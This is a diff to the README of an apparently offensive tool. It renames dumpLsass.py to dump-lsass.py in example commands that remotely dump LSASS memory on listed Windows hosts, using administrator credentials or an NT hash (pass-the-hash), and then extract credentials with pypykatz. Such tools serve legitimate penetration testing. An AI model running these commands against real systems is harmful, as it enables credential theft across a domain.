@@ -33,8 +33,8 @@ pip3 install pypykatz
 
 Run examples:
 ```
-python3 dumpLsass.py -d CONTOSO -u administrator -p Passw0rd\! -f </path/to/file with target IP addresses or hostnames.txt>
-python3 dumpLsass.py -d CONTOSO -u administrator -H <NT Hash> -f </path/to/file with target IP addresses or hostnames.txt>
+python3 dump-lsass.py -d CONTOSO -u administrator -p Passw0rd\! -f </path/to/file with target IP addresses or hostnames.txt>
+python3 dump-lsass.py -d CONTOSO -u administrator -H <NT Hash> -f </path/to/file with target IP addresses or hostnames.txt>
 ```
 
 If pypykatz is unable to dump creds from the dump files, your target is most likely running a recent Windows build which pypykatz and mimikatz no longer works.
